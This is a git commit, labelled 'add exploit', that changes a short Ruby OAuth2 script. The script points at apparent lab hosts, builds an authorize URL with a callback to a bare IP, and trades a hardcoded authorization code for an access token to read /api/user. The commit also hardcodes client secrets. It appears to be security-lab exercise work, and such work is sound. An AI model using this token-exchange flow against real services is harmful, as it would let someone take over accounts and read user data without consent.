1509dc67d223616e29be289e787903093414b2d0
neal1991 <neal1991@sina.com>
2020-11-05 15:38:14 +0800

    add exploit

--- auth/oauth/token.rb
+++ auth/oauth/token.rb
@@ -1,15 +1,14 @@
 require 'oauth2'
 
 callback = "http://121.36.215.221/"
-app_id = "b72fb9768188bbcf79143b1b6f6464b98d8418c71c527165aa15d0fae67d809d"
+app_id = "c5ddce2c4a2ed487441144608748d675c639b0e4d722d97ee6d0add44e66a206"
 
-secret = "8704640c992299bb60a4cf2ea69d37976bce7b892cd325f08bd422cd0259cbda"
-client = OAuth2::Client.new(app_id, secret, site: "http://authorization-ptl-df6521cb-4c1f1d14.libcurl.so/")
+secret = "72dfaf57c017adb0a69f5f01ceb5bdcb9283772bec54380da0301a0935505124"
+client = OAuth2::Client.new(app_id, secret, site: "http://authorization-ptl-402e9b14-540bfe3a.libcurl.so/")
 puts client.auth_code.authorize_url(redirect_uri: callback)
-exit
 
 
-code="[CODE]"
+code="bcf616ab790e45c2dbe2c7e2946652f13cda97f995255088207ea32dabe51fe2"
 access = client.auth_code.get_token( code, redirect_uri: callback)
 access.get("/api/user").parsed
 
